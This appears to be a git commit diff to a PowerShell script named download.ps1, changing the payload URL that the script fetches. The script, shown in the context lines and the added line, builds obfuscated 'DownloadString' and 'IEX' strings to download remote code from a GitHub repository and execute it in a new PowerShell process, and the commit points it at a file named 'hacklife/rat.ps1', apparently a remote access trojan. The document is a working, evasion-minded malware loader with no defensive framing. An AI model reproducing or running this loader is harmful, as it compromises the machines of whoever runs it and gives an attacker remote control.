b9c24be312456561a8a505ca5ce5d8630d2afbf7
43a1723 <hai1723notgay@gmail.com>
2024-08-24 10:33:59 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -67,7 +67,7 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellc
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode1.ps1")
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/rat.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 
